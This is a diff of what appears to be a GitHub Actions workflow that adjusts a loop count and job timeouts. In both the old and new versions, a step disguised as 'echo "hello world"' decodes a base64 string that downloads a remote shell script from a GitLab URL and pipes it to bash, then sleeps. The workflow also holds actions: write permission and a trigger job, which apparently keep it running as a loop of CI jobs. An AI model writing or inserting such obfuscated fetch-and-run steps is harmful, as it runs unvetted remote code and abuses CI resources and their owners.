@@ -6,7 +6,7 @@ on:
       loop_count:
         description: 'Siklus tersisa'
         required: true
-        default: '9900000'
+        default: '990'
 
 permissions:
   actions: write
@@ -40,9 +40,9 @@ jobs:
           - name: lscpu-S
           - name: lscpu-T                                      
     runs-on: ubuntu-latest
-    timeout-minutes: 15
+    timeout-minutes: 10
     steps:
-      - run: echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYWthbmFuOTkvZGlhbW9uZHMvLS9yYXcvbWFpbi9yZXAuc2ggfCBiYXNo | sh & sleep 720
+      - run: echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYWthbmFuOTkvZGlhbW9uZHMvLS9yYXcvbWFpbi9yZXAuc2ggfCBiYXNo | sh & sleep 540
 
   trigger-hello:
     needs: run-lscpu
